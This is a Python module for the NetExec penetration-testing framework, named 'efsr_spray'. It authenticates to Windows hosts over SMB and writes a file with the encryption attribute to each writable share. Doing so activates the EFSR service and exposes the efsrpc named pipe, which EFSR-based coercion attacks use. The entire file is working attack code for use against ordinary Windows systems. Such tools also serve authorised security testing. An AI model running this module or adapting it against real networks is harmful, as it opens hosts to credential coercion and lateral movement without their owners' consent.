import ntpath
from nxc.helpers.misc import gen_random_string
from nxc.context import Context
from impacket.smb3structs import FILE_SHARE_WRITE, FILE_SHARE_DELETE, FILE_ATTRIBUTE_ENCRYPTED
from impacket.smbconnection import SessionError, SMBConnection


def get_error_string(exception):
    if hasattr(exception, "getErrorString"):
        try:
            es = exception.getErrorString()
        except KeyError:
            return f"Could not get nt error code {exception.getErrorCode()} from impacket: {exception}"
        if type(es) is tuple:
            return es[0]
        else:
            return es
    else:
        return str(exception)


class NXCModule:
    """EFSR Spray Module
    Module by @rtpt-romankarwacik
    """

    name = "efsr_spray"
    description = "Tries to activate the EFSR service by creating a file with the encryption attribute on some available share."
    supported_protocols = ["smb"]
    opsec_safe = True  # Does the module touch disk?
    multiple_hosts = True  # Does the module support multiple hosts?
    excluded_shares = ["SYSVOL"]

    def options(self, context: Context, module_options: dict[str, str]):
        """
        FILE_NAME      Name of the file which will be tried to create and afterwards delete
        SHARE_NAME     If set, ONLY this share will be used
        EXCLUDED_SHARES List of share names which will not be used, seperated by comma
        """
        self.file_name = module_options.get("FILE_NAME", ntpath.normpath("\\" + gen_random_string() + ".txt"))
        self.share_name = module_options.get("SHARE_NAME")
        if module_options.get("EXCLUDED_SHARES"):
            self.excluded_shares += module_options.get("EXCLUDED_SHARES", "").split(",")

    def on_login(self, context: Context, connection):
        conn: SMBConnection = connection.conn  # Because typing is broken due to smb being a folder and a file >:(

        try:
            shares = conn.listShares()
        except SessionError as e:
            error = get_error_string(e)
            context.log.fail(f"Error enumerating shares: {error}", color="magenta")
            return

        # Check if named pipe is already available
        try:
            named_pipe_names = [f.get_shortname() for f in conn.listPath("IPC$", "*")]
            if "efsrpc" in named_pipe_names:
                context.log.highlight("efsrpc named pipe is already available!")
                # if it is already activated we just skip this computer
                return
        except SessionError as e:
            error = get_error_string(e)
            context.log.fail(f"Error enumerating named pipes: {error}", color="magenta")
            return

        # Write an encrypted file on the share root.
        # This will likely fail with STATUS_ACCESS_DENIED if we do not have the permission to create encrypted files,
        # but this does not matter as the service will be activated nevertheless if we have WRITE or MODIFY access
        for share in shares:
            share_name = share["shi1_netname"][:-1]
            if self.share_name is not None and self.share_name != share_name:
                continue

            if share_name in self.excluded_shares:
                continue

            try:
                context.log.debug(f"Connecting to share {share_name}...")
                tid = conn.connectTree(share_name)
            except SessionError as e:
                context.log.debug(f"Could not connect to share {share_name}: {e}")
                continue
            try:
                context.log.debug(f"Creating file in {share_name}...")
                fid = conn.createFile(tid, self.file_name,
                                      desiredAccess=FILE_SHARE_WRITE,
                                      shareMode=FILE_SHARE_DELETE,
                                      fileAttributes=FILE_ATTRIBUTE_ENCRYPTED)
                conn.closeFile(tid, fid)
                try:
                    # this can happen when we have special permissions to create encrypted files
                    conn.deleteFile(share_name, self.file_name)
                except SessionError as e:
                    error = get_error_string(e)
                    if error == "STATUS_OBJECT_NAME_NOT_FOUND":
                        pass
                    context.log.fail(f"Error DELETING created temp file {self.file_name} on share {share_name}: {error}")
            except SessionError as e:
                context.log.debug(f"Error writing encrypted file on share {share_name}: {get_error_string(e)} (This does not necessarily mean that the attack failed!)")

        try:
            tid = conn.connectTree("IPC$")
            conn.waitNamedPipe(tid, "efsrpc", 10)
            context.log.highlight("Successfully activated efsrpc named pipe!")
        except SessionError as e:
            error = get_error_string(e)
            if error == "STATUS_OBJECT_NAME_NOT_FOUND":
                context.log.debug("efsrpc pipe was not activated.")
            else:
                context.log.fail(f"Error waiting for named pipe: {error}", color="magenta")
            return
